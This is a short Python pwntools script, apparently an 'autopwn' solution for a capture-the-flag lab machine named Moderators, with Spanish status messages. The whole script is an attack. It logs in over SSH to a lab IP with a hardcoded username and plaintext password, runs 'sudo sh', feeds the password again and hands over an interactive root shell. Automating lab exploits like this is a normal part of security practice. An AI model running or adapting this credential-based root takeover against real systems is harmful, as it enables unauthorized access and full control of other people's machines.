try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Moderators ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

request = ssh(host='10.10.11.173', user='john', password='$_THE_best_Sysadmin_Ever_')
shell = request.process("/bin/sh")
shell.sendline(b"sudo sh")
shell.recvuntil(b"john:")
shell.sendline(b"$_THE_best_Sysadmin_Ever_")
shell.sendline(b"export HOME=/; bash")
shell.recvuntil(b"#")
shell.sendline(b"export HOME=/root; cd; echo")
shell.interactive()
